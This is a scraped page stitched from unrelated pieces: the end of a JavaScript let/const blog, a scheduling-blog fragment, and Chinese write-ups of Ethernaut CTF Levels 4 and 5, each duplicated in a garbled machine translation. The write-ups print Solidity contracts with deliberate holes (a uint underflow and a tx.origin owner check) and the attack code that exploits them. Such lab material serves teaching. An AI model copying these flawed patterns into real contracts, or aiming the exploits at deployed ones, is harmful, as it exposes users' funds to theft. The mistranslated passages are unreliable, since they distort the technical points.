    • The below screenshot shows the TDZ time for the variable USER for the above code.

    const and Redeclarations

    • You cannot re-declare a variable using const that was already declared with the same name within the same scope. If you do so, you will receive a SyntaxError.

    • Check out the code snippet below.

    • Check out the output for the above code-

    • Just like let, you also cannot declare a variable using const that was previously declared using var with the same name and within the same scope.

    SUMMARY

    That's all for this blog. Phew! Now, I know that this series was a lot, but then this is one of the most important concepts and is often asked in interviews.

    To make things simpler, here's a flow chart citing the differences between let, const, and 'var` declarations.

    Thank you for sticking till the end.
    Please do share if this helped you and also I would love to hear your thoughts!

    Zujaj Misbah Khan - May 16

item.title: Ethernaut系列-Level 5(Token) | Ethernaut系列-Level 5(Token)
item.description:
发表于令牌，给10个令牌，要求变成很多个

要点

计算溢出问题solidity0.8前的是没做溢出报错的，如uint负数后会很大，solidity0.8后版本会占用库如openzeppel的SafeMath来保障，直接计算计算， EVM 会报错。

解题思路

只传10个token，最多传个1000个，transfer test/05Token 

 it ( " attacks " , async function () { //调用合约transfer await levelContract . connect ( player ). transfer ( levelOwner . address , 1000 ); }); it ( " check " , async function () { //检查通过条件expect ( await levelContract . balanceOf ( player . address )). to . above ( 1000 ); });


原文:

bin2chen

Posted on May 20 

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0; contract Token { mapping(address => uint) balances; uint public totalSupply; constructor(uint _initialSupply) public { balances[msg.sender] = totalSupply = _initialSupply; } function transfer(address _to, uint _value) public returns (bool) { require(balances[msg.sender] - _value >= 0); balances[msg.sender] -= _value; balances[_to] += _value; return true; } function balanceOf(address _owner) public view returns (uint balance) { return balances[_owner]; }
}

起始给10个token,要求变成很多很多个token

要点

数值计算溢出问题，solidity0.8前的版本是没做溢出报错的，如uint计算负数后会变成很大，solidity0.8后就不用第三方库如openzeppelin的SafeMath来保障，直接计算即可，EVM会报错。

解题思路

只有10个token,transfer传1000个就会溢出 test/05Token.js

 it("attacks", async function () { //调用合约transfer await levelContract.connect(player).transfer(levelOwner.address, 1000); }); it("check", async function () { //检查通过条件 expect(await levelContract.balanceOf(player.address)).to.above(1000); });
item.author: bin2chen

item.title: 组织和调度 | Organizing & Scheduling
item.description:
索尼德布

发表于很难维持每日博客。 我已经尝试过并且失败了。 所以我还不如在这里保持每周一次，直到我可以每天保持一次。

我会在每个星期天发帖。

现在创建 4 个系列：

  • 机器学习学习

item.title: Ethernaut系列-Level 4(电话) | Ethernaut系列-Level 4(Telephone)
item.description:
发表于所有者设为播放器

要点

合同里判断调用人，一定要用msg.sender，不要用tx.origin

解题思路

写个合约调用，再用javascript调用自己的合约，tx.origin和msg.sender一定要优先

合同/04TelephoneRun.sol

 interface ILevel { function changeOwner ( address _owner ) external ; } contract TelephoneRun { function run ( address _levelAddress ) external { ILevel ( _levelAddress ). changeOwner ( msg . sender ); } }

测试/04电话.js

 it ( " attacks " , async function () { await runContract . connect ( player ). run ( levelContract . address ); });



原文:

bin2chen

Posted on May 20 

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0; import '@openzeppelin/contracts/math/SafeMath.sol'; contract Telephone { address public owner; constructor() public { owner = msg.sender; } function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; } }
}

owner设为player

要点

合约里判断调用人，一定要用msg.sender，不要用tx.origin

解题思路

写个合约调用关卡合约，再用javascript调用自己的合约,tx.origin和msg.sender就会不一定

contracts/04TelephoneRun.sol

interface ILevel { function changeOwner(address _owner) external;
} contract TelephoneRun { function run(address _levelAddress) external { ILevel(_levelAddress).changeOwner(msg.sender); }
}

test/04Telephone.js

 it("attacks", async function () { await runContract.connect(player).run(levelContract.address); });
